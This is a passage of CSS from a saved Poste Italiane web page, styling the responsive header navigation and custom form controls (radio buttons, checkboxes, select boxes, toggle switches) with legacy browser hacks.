        overflow: hidden;
    }
    .navbar-default .navbar-toggle:hover {
        background-color: transparent;
    }
    .navbar-default .navbar-toggle .icon-bar {
        height: 1px;
        background-color: #4a4a4a;
        -webkit-transition: opacity, -webkit-transform;
        transition: opacity, -webkit-transform;
        transition: opacity, transform;
        transition: opacity, transform, -webkit-transform;
        -webkit-transition-duration: 200ms;
        transition-duration: 200ms;
        -webkit-transition-timing-function: cubic-bezier(0.7, 0, 0, 0.7);
        transition-timing-function: cubic-bezier(0.7, 0, 0, 0.7);
    }
    .navbar-default .navbar-toggle:not(.collapsed) .icon-bar:nth-child(2) {
        -webkit-transform: translateY(3px) rotate(45deg);
        transform: translateY(3px) rotate(45deg);
    }
    .navbar-default .navbar-toggle:not(.collapsed) .icon-bar:nth-child(3) {
        -webkit-transform: translateY(-2px) rotate(-45deg);
        transform: translateY(-2px) rotate(-45deg);
    }
    .navbar-default .navbar-toggle.navbar-toggle-left {
        float: left;
    }
    .navbar-default .logo-mobile,
    .header-minified .logo-mobile {
        position: absolute;
        left: 25%;
        right: 25%;
        top: 10px;
        text-align: center;
    }
    .header-minified .logo-mobile {
        top: 0px;
    }
    .navbar-default .navbar-collapse {
        border: none;
        background-color: transparent;
    }
    #megamenu-collapse {
        z-index: 10;
        position: relative;
        overflow-y: hidden;
    }
    #megamenu-collapse .nav-col-left {
        background-color: #f6f6f6;
        display: none;
    }
    #megamenu-collapse .nav-col-right {
        border-left: 1px solid #d0d0d0;
        background-color: #fff;
    }
    #megamenu-collapse #navigation-menu-container {
        width: 100%;
    }
    #header-poste-italiane .navbar-mysite-main {
        padding: 15px 25px;
        background-color: #f6f6f6;
    }
    #header-poste-italiane .navbar-mysite-list-wrap {
        background-color: #f6f6f6;
    }
    #header-poste-italiane .navbar-mysite-list-wrap {
        padding: 0px 15px;
    }
    #header-poste-italiane .navbar-mysite-list li a {
        padding: 0 10px;
    }
    #header-poste-italiane .navbar-mysite-list.navbar-mysite-list-special li {
        margin-left: -15px;
        margin-right: -15px;
        padding: 0 15px;
    }
    #header-poste-italiane .navbar-clonewrap,
    #header-poste-italiane .menu-ul {
        border-top: 1px solid #ececec;
        margin: 0 -15px;
        padding: 0px 30px;
    }
    #header-poste-italiane .navbar-clonewrap {
        background-color: #f6f6f6;
    }
    #header-poste-italiane .navbar-clonewrap .onlineservices {
        padding: 20px 0;
    }
    #header-poste-italiane .navbar-logo,
    #header-poste-italiane .navbar-search,
    #header-poste-italiane .menu-ul {
        float: none;
    }
    #header-poste-italiane .navbar-targetlink {
        text-align: center;
    }
    #header-poste-italiane .navbar-targetlink .targetlink {
        position: absolute;
        bottom: 0;
        width: 100%;
        padding: 20px 0;
        border-top: 1px solid #d0d0d0;
    }
    #header-poste-italiane .navbar-search {
        margin: 30px -15px 0;
        text-align: right;
        background-color: #f6f6f6;
        padding: 0 15px;
        display: block!important;
        position: relative;
        right: auto;
    }
    #header-poste-italiane .navbar-search .navbar-search-text {
        display: inline-block;
        float: left;
        color: #222427;
    }
    #header-poste-italiane .navbar-search .btn-cta {
        line-height: 30px;
        padding: 2px 17px;
        border-width: 2px!important;
        margin: 0;
        background-size: 18px auto!important;
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-cerca@2x.png*/ url()!important;
    }
    #header-poste-italiane .menu-ul {
        padding-top: 10px;
        padding-bottom: 30px;
        background-color: #fff;
    }
    #header-poste-italiane ul li {
        float: none;
    }
    #header-poste-italiane ul li.pi-servizio {
        height: 46px;
        margin: 0;
        border-bottom: 1px solid #ccc;
    }
    #header-poste-italiane ul li.pi-servizio a.first-level {
        display: block;
        width: 100%;
        height: 100%;
        line-height: 46px;
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-right.png*/ url();
        background-repeat: no-repeat;
        background-position: right center;
        background-size: 9px 14px;
        outline: none;
    }
    #header-poste-italiane ul li.pi-servizio:hover {
        border-bottom-color: #ccc!important;
    }
    #header-poste-italiane ul li#pi-servizionline.pi-servizio {
        margin-top: auto;
        margin-left: 0px;
        margin-right: 0px;
        height: 46px;
        background-color: transparent;
        padding: 0;
    }
    #header-poste-italiane div.navigation-submenu {
        position: static;
        top: auto;
        right: auto;
        left: auto;
        background-color: transparent;
        padding: 0px;
        border: none;
        display: block;
    }
    #header-poste-italiane div.navigation-submenu .navigation-submenu-container {
        border-bottom: 1px solid #ececec;
        line-height: 46px;
        outline: none;
    }
    #header-poste-italiane div.navigation-submenu .navigation-submenu-container .container {
        width: auto;
    }
    #header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow .navigation-collapse-container {
        background-color: #f6f6f6;
        margin: 0 -30px;
    }
    #header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow .navigation-collapse-container .navigation-collapse-container-wrap {
        padding: 20px 25px;
    }
    #header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow .col-mainrow {
        padding: 0;
    }
    #header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow .col-mainrow h3 {
        margin: 0;
        height: 46px;
        text-transform: uppercase;
        vertical-align: middle;
        display: table-cell;
        font-weight: bold;
        font-size: 16px;
    }
    #header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow .col-mainrow h3.pi-servizio-mobile {
        display: block;
        font-weight: 500;
        font-size: 15px;
    }
    #header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow .col-mainrow h3.pi-servizio-mobile a {
        padding: 0 10px;
    }
    #header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow .col-mainrow h3.pi-servizio-mobile a {
        color: #0047bb;
        display: block;
        line-height: 46px;
        width: 100%;
        height: 100%;
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-down.png*/ url();
        background-repeat: no-repeat;
        background-position: right 10px center;
        outline: none;
        text-decoration: none;
        font-weight: bold;
    }
    #header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow .col-mainrow h3.pi-servizio-mobile a.collapsed {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-right.png*/ url();
        background-size: 9px 14px;
        color: #222427;
        font-weight: 500;
    }
    #header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow .col-mainrow .list-menu li a {
        line-height: 26px;
    }
    #header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow .col-mainrow:hover {
        background-color: transparent;
    }
    #header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow h3:not(.pi-servizio-mobile),
    #header-poste-italiane div.navbar-clonewrap h3:not(.pi-servizio-mobile) {
        display: block;
        height: auto;
        padding: 14px 0 7px;
    }
    /*
    #header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow  h3.pi-servizio-mobile,
    #header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow  h3.pi-servizio-mobile a{margin: 0px;}
    */
}

@media (min-width: 768px) and (max-width: 991px) {
    #header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow h3:not(.pi-servizio-mobile),
    #header-poste-italiane div.navbar-clonewrap h3:not(.pi-servizio-mobile) {
        display: block;
        height: auto;
        padding: 8px 0px 0px 0px;
    }
    .navbar-default {
        /*
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        */
    }
    .navbar-default .navbar-toggle {
        margin-top: 5px;
        margin-bottom: 5px;
        border: none;
        height: 34px;
        overflow: hidden;
    }
    .navbar-default .navbar-toggle:hover {
        background-color: transparent;
    }
    .navbar-default .navbar-toggle .icon-bar {
        height: 1px;
        background-color: #4a4a4a;
        -webkit-transition: opacity, -webkit-transform;
        transition: opacity, -webkit-transform;
        transition: opacity, transform;
        transition: opacity, transform, -webkit-transform;
        -webkit-transition-duration: 200ms;
        transition-duration: 200ms;
        -webkit-transition-timing-function: cubic-bezier(0.7, 0, 0, 0.7);
        transition-timing-function: cubic-bezier(0.7, 0, 0, 0.7);
    }
    .navbar-default .navbar-toggle:not(.collapsed) .icon-bar:nth-child(2) {
        -webkit-transform: translateY(3px) rotate(45deg);
        transform: translateY(3px) rotate(45deg);
    }
    .navbar-default .navbar-toggle:not(.collapsed) .icon-bar:nth-child(3) {
        -webkit-transform: translateY(-2px) rotate(-45deg);
        transform: translateY(-2px) rotate(-45deg);
    }
    .navbar-default .navbar-toggle.navbar-toggle-left {
        float: left;
    }
    .navbar-default .logo-mobile,
    .header-minified .logo-mobile {
        position: absolute;
        left: 25%;
        right: 25%;
        top: 10px;
        text-align: center;
    }
    .header-minified .logo-mobile {
        top: 0px;
    }
    .navbar-default .navbar-collapse {
        border: none;
        background-color: transparent;
    }
    #megamenu-collapse {
        z-index: 10;
        position: relative;
        overflow-y: hidden;
    }
    #megamenu-collapse .nav-col-left {
        background-color: #f6f6f6;
    }
    #megamenu-collapse .nav-col-right {
        border-left: 1px solid #d0d0d0;
    }
    #megamenu-collapse #navigation-menu-container {
        width: 100%;
    }
    #header-poste-italiane .navbar-clonewrap,
    #header-poste-italiane .menu-ul {
        border-top: 1px solid #ececec;
        margin: 0 -15px;
        padding: 0px 30px;
    }
    #header-poste-italiane .navbar-clonewrap {
        background-color: #f6f6f6;
    }
    #header-poste-italiane .navbar-clonewrap .onlineservices {
        padding: 20px 0;
    }
    #header-poste-italiane .navbar-logo,
    #header-poste-italiane .navbar-search,
    #header-poste-italiane .menu-ul {
        float: none;
        position: relative;
        right: auto;
    }
    #header-poste-italiane .navbar-targetlink {
        text-align: center;
    }
    #header-poste-italiane .navbar-targetlink .targetlink {
        position: absolute;
        bottom: 0;
        width: 100%;
        padding: 20px 0;
        border-top: 1px solid #d0d0d0;
    }
    #header-poste-italiane .navbar-search {
        margin: 0 -15px 0;
        text-align: right;
        background-color: #f6f6f6;
        padding: 0 25px;
    }
    #header-poste-italiane .navbar-search .navbar-search-text {
        display: inline-block;
        float: left;
        color: #222427;
    }
    #header-poste-italiane .navbar-search .btn-cta {
        line-height: 30px;
        padding: 2px 17px;
        border-width: 2px!important;
        margin: 0;
        background-size: 18px auto!important;
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-cerca@2x.png*/ url()!important;
    }
    #header-poste-italiane .menu-ul {
        padding-top: 10px;
        padding-bottom: 30px;
        background-color: #fff;
    }
    #header-poste-italiane ul li {
        float: none;
    }
    #header-poste-italiane ul li.pi-servizio {
        height: 46px;
        margin: 0;
        border-bottom: 1px solid #ececec;
    }
    #header-poste-italiane ul li.pi-servizio a.first-level {
        display: block;
        width: 100%;
        height: 100%;
        line-height: 46px;
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-right.png*/ url();
        background-repeat: no-repeat;
        background-position: right center;
        background-size: 9px 14px;
        outline: none;
    }
    #header-poste-italiane ul li.pi-servizio:hover {
        border-bottom-color: #ececec!important;
    }
    #header-poste-italiane ul li#pi-servizionline.pi-servizio {
        margin-top: auto;
        margin-left: 0px;
        margin-right: 0px;
        height: 46px;
        background-color: transparent;
        padding: 0;
    }
    #header-poste-italiane div.navigation-submenu {
        position: static;
        top: auto;
        right: auto;
        left: auto;
        background-color: transparent;
        padding: 20px 15px;
        border-bottom: none;
    }
    #header-poste-italiane div.navigation-submenu .navigation-submenu-container .container {
        width: auto;
    }
    #header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow .col-mainrow,
    #header-poste-italiane div.navigation-submenu .navigation-submenu-container-overrow .col-overrow {
        padding: 0;
    }
    #header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow .col-mainrow:hover {
        background-color: transparent;
    }
    .area-ico a {
        background-position: center left;
        padding-left: 35px!important;
    }
}

@media (min-width: 992px) and (max-width: 1199px) {
    #header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow h3 a,
    #header-poste-italiane div.navbar-clonewrap h3 a {
        display: block;
        padding: 7px 15px 7px 15px;
        margin-left: -15px;
        margin-right: -15px;
        margin-bottom: -10px;
        margin-top: -10px;
        line-height: 1.2;
    }
    #header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow h3:hover a,
    #header-poste-italiane div.navbar-clonewrap h3:hover a {
        background-color: #ececec;
        color: #0047bb;
    }
    .nav-col {
        min-height: auto!important;
    }
    #navigation {
        background-color: transparent!important;
    }
    #header-poste-italiane .menu-ul {
        margin-right: 0px;
        margin-left: 15px;
    }
    #header-poste-italiane ul li#pi-servizionline.pi-servizio {
        padding: 4px 15px 0;
    }
    #header-poste-italiane .navbar-logo img {
        width: 154px;
    }
    #header-poste-italiane ul li.pi-servizio {
        margin-left: 8px;
        margin-right: 8px;
    }
}

@media (min-width: 1200px) {
    #header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow h3 a,
    #header-poste-italiane div.navbar-clonewrap h3 a {
        display: block;
        padding: 7px 15px 7px 15px;
        margin-left: -15px;
        margin-right: -15px;
        margin-bottom: -10px;
        margin-top: -10px;
        line-height: 1.2;
    }
    #header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow h3:hover a,
    #header-poste-italiane div.navbar-clonewrap h3:hover a {
        background-color: #ececec;
        color: #0047bb;
    }
    .nav-col {
        min-height: auto!important;
    }
    #navigation {
        background-color: transparent!important;
    }
}


/* High res Display and XS */

@media only screen and (-webkit-min-device-pixel-ratio: 2) and (max-width: 767px),
only screen and (min-resolution: 192dpi) and (max-width: 767px) {
    #header-poste-italiane ul li.pi-servizio a.first-level,
    #header-poste-italiane div.navigation-submenu .navigation-submenu-container-mainrow .col-mainrow h3 a.collapsed {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-right@2x.png*/ url();
    }
    .area-ico a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-ancora@2x.png*/ url();
    }
}


/* High res Display and SM */

@media only screen and (-webkit-min-device-pixel-ratio: 2) and (min-width: 768px) and (max-width: 991px),
only screen and (min-resolution: 192dpi) and (min-width: 768px) and (max-width: 991px) {
    #header-poste-italiane ul li.pi-servizio a.first-level {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-right@2x.png*/ url();
    }
    .area-ico a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-ancora@2x.png*/ url();
    }
}
</style>
			
			
			
		
			
			
				<style data-savepage-href="/risorse_dt/condivise/stili/trasversali/retina.css" type="text/css">/*

Retina.css GD//FS//DU (c) Poste Italiane 2016

*/
</style>
			
			
			
		
			
			
				<style data-savepage-href="/risorse_dt/applicazioni/trasversali/stili/custom-form-element.css" type="text/css">/*****************************************************

    Foglio stile - (c) Poste Italiane 2016 - Applicazioni -  GD//FS//DU

*****************************************************/


/****************************/
/* custom File input button */
/****************************/

.custom-file-input {
    /*display: inline-block;*/
    overflow: hidden;
    position: relative;
}

.custom-file-input input[type="file"] {
    width: 100%;
    height: 100%;
    opacity: 0;
    filter: alpha(opacity=0);
    zoom: 1;
    /* Fix for IE7 */
    position: absolute;
    top: 0;
    left: 0;
    z-index: 999;
    cursor: pointer;
    display: block;
}

.inputfile-disabled .custom-file-input input[type="file"]:hover,
.disabled .custom-file-input input[type="file"]:hover {
    cursor: not-allowed;
}

.inputfile-disabled .custom-file-input .input-group .form-control[type="text"],
.disabled .custom-file-input .input-group .form-control[type="text"] {
    background-color: transparent;
    border-color: #d0d0d0 !important;
    border-style: dashed;
    color: #d0d0d0;
}

.inputfile-disabled .custom-file-input .input-group .input-group-addon:last-child,
.disabled .custom-file-input .input-group .input-group-addon:last-child {
    border-color: #d0d0d0 !important;
    border-style: dashed;
    color: #d0d0d0;
}


/***********************/
/* custom Radio button */
/***********************/

.custom-radio {
    width: 16px;
    height: 16px;
    display: inline-block;
    position: relative;
    z-index: 1;
    top: 3px;
    left: -8px;
    background-image: url("/risorse_dt/applicazioni/trasversali/immagini/radio.png");
    background-size: 16px;
    background-repeat: no-repeat;
    background-position: top left;
}

.panel-dashboard .dashboard-wrap-radio .custom-radio{
    position: absolute;
    top: 8px;
    left: -38px;
}

.custom-radio:hover {
    background-image: url("/risorse_dt/applicazioni/trasversali/immagini/radio-hover.png");
}

.custom-radio-focused {
    background-image: url("/risorse_dt/applicazioni/trasversali/immagini/radio-focused.png");
}

.custom-radio.selected {
    background-image: url("/risorse_dt/applicazioni/trasversali/immagini/radio-selected.png");
}

.custom-radio input[type="radio"] {
    margin: 1px;
    position: absolute;
    z-index: 2;
    cursor: pointer;
    outline: none;
    opacity: 0;
    /* CSS hacks for older browsers */
    _noFocusLine: expression(this.hideFocus=true);
    -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";
    filter: alpha(opacity=0);
    -khtml-opacity: 0;
    -moz-opacity: 0;
}

.has-error .custom-radio {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-error.png*/ url();
}

.has-error .custom-radio:hover {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-error-hover.png*/ url();
}

.has-error .custom-radio-focused {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-focused.png*/ url();
}

.has-error .custom-radio.selected {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-error-selected.png*/ url();
}

.has-warning .custom-radio {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-warning.png*/ url();
}

.has-warning .custom-radio:hover {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-warning-hover.png*/ url();
}

.has-warning .custom-radio-focused {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-focused.png*/ url();
}

.has-warning .custom-radio.selected {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-warning-selected.png*/ url();
}

.radio.disabled .custom-radio {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-disabled.png*/ url();
}

.radio.disabled .custom-radio {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-disabled.png*/ url();
}

.radio.disabled .custom-radio.selected {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-disabled-selected.png*/ url();
}

.radio.readonly .custom-radio {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-disabled.png*/ url();
}

.radio.readonly .custom-radio.selected {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-disabled-selected.png*/ url();
}


/******************/


/* custom Checkbox */


/******************/

.custom-checkbox {
    width: 16px;
    height: 16px;
    display: inline-block;
    position: relative;
    z-index: 1;
    top: 3px;
    left: -8px;
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox.png*/ url();
    background-size: 16px 16px;
    background-repeat: no-repeat;
    background-position: top left;
}

.panel-dashboard .dashboard-wrap-checkbox .custom-checkbox{
    position: absolute;
    top: 8px;
    left: -38px;
}

.custom-checkbox:hover {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-hover.png*/ url();
}

.custom-checkbox-focused {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-focused.png*/ url();
}

.custom-checkbox.selected {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-selected.png*/ url();
}

.custom-checkbox input[type="checkbox"] {
    margin: 0;
    position: absolute;
    z-index: 2;
    cursor: pointer;
    outline: none;
    opacity: 0;
    /* CSS hacks for older browsers */
    _noFocusLine: expression(this.hideFocus=true);
    -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";
    filter: alpha(opacity=0);
    -khtml-opacity: 0;
    -moz-opacity: 0;
}

.has-error .custom-checkbox {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-error.png*/ url();
}

.has-error .custom-checkbox:hover {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-error-hover.png*/ url();
}

.has-error .custom-checkbox-focused {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-error-focused.png*/ url();
}

.has-error .custom-checkbox.selected {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-error-selected.png*/ url();
}

.has-warning .custom-checkbox {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-warning.png*/ url();
}

.has-warning .custom-checkbox:hover {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-warning-hover.png*/ url();
}

.has-warning .custom-checkbox-focused {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-warning-focused.png*/ url();
}

.has-warning .custom-checkbox.selected {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-warning-selected.png*/ url();
}

.checkbox.disabled .custom-checkbox {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-disabled.png*/ url();
}

.checkbox.disabled .custom-checkbox.selected {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-disabled-selected.png*/ url();
}

.checkbox.readonly .custom-checkbox {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-disabled.png*/ url();
}

.checkbox.readonly .custom-checkbox.selected {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-disabled-selected.png*/ url();
}


/******************/


/* custom Select */


/******************/

.select-wrapper {
    float: none;
    display: inline-block;
    height: 47px !important;
    /*default value*/
    /*background: url("/risorse_dt/applicazioni/trasversali/immagini/dropdown.png") no-repeat right center;*/
    background: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-freccia-down@2x.png*/ url() no-repeat right center;
    background-size: 24px;
    cursor: pointer;
    /*background-color: #fff;*/
    background-color: transparent;
    position: relative;
}

.form-group .select-wrapper {
    height: 34px !important;
}

.form-group-lg .select-wrapper {
    height: 46px !important;
}

.select-wrapper:hover,
.select-wrapper-focused {
    background: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-blue-2x/ico-freccia-down@2x.png*/ url() no-repeat right center;
    background-size: 24px;
}

.select-wrapper .holder {
    display: block;
    margin: 4px 35px 0 5px;
    /*default value*/
    white-space: nowrap;
    overflow: hidden;
    cursor: pointer;
    /*position: relative;*/
    z-index: -1;
}

.form-group .select-wrapper .holder {
    margin: 0px 35px 0 0px;
}

.form-group-lg .select-wrapper .holder {
    margin: 1px 35px 0 0px;
}

.select-wrapper select {
    margin: 0;
    position: absolute !important;
    z-index: 2;
    cursor: pointer;
    outline: none;
    opacity: 0;
    /* CSS hacks for older browsers */
    _noFocusLine: expression(this.hideFocus=true);
    -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";
    filter: alpha(opacity=0);
    -khtml-opacity: 0;
    -moz-opacity: 0;
    top: 0;
    left: 0;
}

.select-wrapper select[disabled],
.select-wrapper select[readonly] {
    margin: 0;
    position: absolute;
    z-index: 2;
    cursor: pointer;
    outline: none;
    opacity: 0;
    /* CSS hacks for older browsers */
    _noFocusLine: expression(this.hideFocus=true);
    -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";
    filter: alpha(opacity=0);
    -khtml-opacity: 0;
    -moz-opacity: 0;
    top: 0;
    left: 0;
    cursor: not-allowed;
    background-color: transparent;
}

.select-wrapper.select-disabled select[disabled],
.select-wrapper.select-disabled select[disabled]:hover,
.select-wrapper.select-readonly select[readonly],
.select-wrapper.select-readonly select[readonly]:hover {
    background-color: transparent;
}

.select-disabled {
    border-style: dashed!important;
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/dropdown-disabled.png*/ url();
    background: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-off-2x/ico-freccia-down@2x.png*/ url() no-repeat right center;
    background-size: 24px;
}

.select-disabled:hover {
    background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/dropdown-disabled.png*/ url();
    background: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-off-2x/ico-freccia-down@2x.png*/ url() no-repeat right center;
    background-size: 24px;
}

.select-wrapper.select-disabled .holder {
    color: #d0d0d0;
    position: static;
}


/* custom toggle switch [check] element */

.onoffswitch {
    position: relative;
    width: 54px;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
}

.onoffswitch-checkbox {
    display: none;
}

.onoffswitch-label {
    display: block;
    overflow: hidden;
    cursor: pointer;
    height: 30px;
    padding: 0;
    line-height: 30px;
    border: 1px solid #d0d0d0;
    border-radius: 30px;
    background-color: #fff;
    transition: background-color 0.3s ease-in;
}

.onoffswitch-label:before {
    content: "";
    display: block;
    width: 30px;
    margin: 0px;
    background: #fff;
    position: absolute;
    top: 0;
    bottom: 0;
    right: 24px;
    border: 1px solid #d0d0d0;
    border-radius: 30px;
    transition: all 0.3s ease-in 0s;
}

.onoffswitch-checkbox:checked + .onoffswitch-label {
    background-color: #0047bb;
}

.onoffswitch-checkbox:checked + .onoffswitch-label,
.onoffswitch-checkbox:checked + .onoffswitch-label:before {
    border-color: #0047bb;
    right: 0px;
}

.onoffswitch-checkbox:readonly + .onoffswitch-label,
.onoffswitch-checkbox:disabled + .onoffswitch-label{
    background-color: #d0d0d0 !important;
    right: 0px;
}

.onoffswitch-checkbox:readonly + .onoffswitch-label, .onoffswitch-checkbox:readonly + .onoffswitch-label:before, .onoffswitch-checkbox:disabled + .onoffswitch-label, .onoffswitch-checkbox:disabled + .onoffswitch-label:before, .btn-group.disabled .onoffswitch-checkbox:checked + .onoffswitch-label, .btn-group.disabled .onoffswitch-checkbox:checked + .onoffswitch-label:before{
    border-color: #d0d0d0 !important;
}

.btn-group.disabled .onoffswitch-label:before {
    background: #f3f3f3;
    border-color: #d0d0d0;
}

.btn-group.disabled .onoffswitch-label {
    background: #f9f9f9;
    border-color: #d0d0d0;
}

@media screen and (min-width: 240px) and (max-width: 767px) {
    .form-group .select-wrapper .holder {
        padding: 0;
        margin-left: 0;
    }
    .form-group-lg .select-wrapper .holder {
        padding: 0px;
    }
    .select-wrapper.select-disabled {
        background-color: #fff;
    }
    .select-wrapper.select-disabled .holder {
        color: #999;
    }
    .inputfile-disabled .custom-file-input .input-group .form-control[type="text"] {
        background-color: #fff;
        border-bottom: 1px solid #ccc;
        opacity: 0.5;
    }
    .inputfile .input-group-addon-evidence-primary {
        color: #ccc !important;
    }
    .inputfile-disabled .custom-file-input .input-group .input-group-addon:last-child {
        border: none;
        border-bottom: 1px solid #ccc;
        background-color: #fff;
        color: #d1d1d1;
        opacity: 0.5;
    }
    .inputfile-disabled .custom-file-input input[type="file"]:hover {
        cursor: not-allowed;
    }
}

@media only screen and (-webkit-min-device-pixel-ratio: 2),
only screen and (min-resolution: 192dpi) {
    .custom-checkbox {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox@2x.png*/ url();
    }
    .custom-checkbox:hover {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-hover@2x.png*/ url();
    }
    .custom-checkbox-focused {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-focused@2x.png*/ url();
    }
    .custom-checkbox.selected {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-selected@2x.png*/ url();
    }
    .has-error .custom-checkbox {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-error@2x.png*/ url();
    }
    .has-error .custom-checkbox:hover {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-error-hover@2x.png*/ url();
    }
    .has-error .custom-checkbox-focused {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-error-focused@2x.png*/ url();
    }
    .has-error .custom-checkbox.selected {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-error-selected@2x.png*/ url();
    }
    .has-warning .custom-checkbox {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-warning@2x.png*/ url();
    }
    .has-warning .custom-checkbox:hover {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-warning-hover@2x.png*/ url();
    }
    .has-warning .custom-checkbox-focused {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-warning-focused@2x.png*/ url();
    }
    .has-warning .custom-checkbox.selected {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-warning-selected@2x.png*/ url();
    }
    .checkbox.disabled .custom-checkbox {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-disabled@2x.png*/ url();
    }
    .checkbox.disabled .custom-checkbox.selected {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-disabled-selected@2x.png*/ url();
    }
    .checkbox.readonly .custom-checkbox {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-disabled@2x.png*/ url();
    }
    .checkbox.readonly .custom-checkbox.selected {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/checkbox-disabled-selected@2x.png*/ url();
    }
    .custom-radio {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio@2x.png*/ url();
    }
    .custom-radio:hover {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-hover@2x.png*/ url();
    }
    .custom-radio-focused {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-focused@2x.png*/ url();
    }
    .custom-radio.selected {
